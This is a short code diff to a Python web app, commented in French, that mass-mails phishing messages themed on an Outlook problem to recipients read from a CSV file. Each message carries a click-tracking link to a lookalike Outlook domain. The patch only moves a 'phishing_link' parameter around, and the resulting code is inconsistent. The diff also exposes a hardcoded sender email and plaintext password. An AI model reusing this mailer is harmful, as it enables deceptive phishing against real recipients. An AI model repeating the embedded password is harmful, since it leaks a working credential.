@@ -37,7 +37,8 @@ SENDER_EMAIL = "regence.informatique@liquidationtravail.com"
 SENDER_PASSWORD = "Saouda2025!!"
 
 # Fonction pour envoyer un email de phishing avec un problème lié à Outlook
-def send_email(recipient_email, recipient_name):
+def send_email(recipient_email, recipient_name, phishing_link):
+
     # Construire le lien de phishing avec le tracking du clic
     phishing_link = f"https://outlook-regence.onrender.com/track_open?email={urllib.parse.quote(recipient_email)}&next=https://outlook-regence.onrender.com/"
 
@@ -155,7 +156,8 @@ def send_email_route():
                         if len(row) >= 2:  # Vérifier qu'il y a au moins un email et un nom
                             recipient_email = row[0].strip()
                             recipient_name = row[1].strip()
-                            send_email(recipient_email, recipient_name, phishing_link)
+                            send_email(recipient_email, recipient_name)
+
 
                     return f"Emails envoyés avec succès à tous les destinataires du fichier CSV."
             except Exception as e:
